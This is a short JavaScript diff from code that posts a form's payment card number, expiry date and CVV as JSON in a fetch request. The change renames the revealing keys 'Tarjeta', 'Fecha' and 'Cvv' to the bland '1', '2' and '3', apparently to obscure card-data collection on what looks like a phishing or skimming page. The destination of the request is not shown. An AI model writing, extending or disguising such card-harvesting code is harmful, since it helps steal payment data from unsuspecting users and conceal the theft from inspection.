@@ -14,9 +14,9 @@ try {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            "Tarjeta": formulario.data1.value,
-            "Fecha": formulario.data2.value,
-            "Cvv": formulario.data3.value
+            "1": formulario.data1.value,
+            "2": formulario.data2.value,
+            "3": formulario.data3.value
         })
     });
 
